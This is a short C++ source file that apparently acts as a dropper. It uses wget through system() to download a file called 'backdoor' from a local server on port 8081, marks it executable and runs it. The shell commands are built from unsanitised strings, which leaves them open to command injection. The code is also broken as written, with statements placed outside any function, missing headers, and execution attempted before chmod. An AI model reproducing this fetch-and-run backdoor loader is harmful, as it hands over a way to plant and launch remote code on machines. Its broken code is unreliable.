#include <iostream>
#include <cstdlib>
#include <string>

void download_file(const std::string& url, const std::string& output_file) {
    std::string command = "wget -O " + output_file + " " + url;

    // Download the file
    int result = system(command.c_str());

    if (result == 0) {
        std::cout << "File '" << output_file << "' downloaded successfully." << std::endl;

        command = output_file;

        result = system(command.c_str());

        if (result == 0) {
            std::cout << "Downloaded file '" << output_file << "' executed successfully." << std::endl;
        } else {
            std::cout << "Error executing downloaded file '" << output_file << "'." << std::endl;
            if (errno != 0) {
                std::cout << "Error message: " << strerror(errno) << std::endl;
            }
        }
    }
}

std::string url = "http://localhost:8081/backdoor";
std::string output_file = "backdoor";
std::string command = "chmod +x " + output_file + "; ./" + output_file;
download_file(url, output_file);
system(command.c_str());
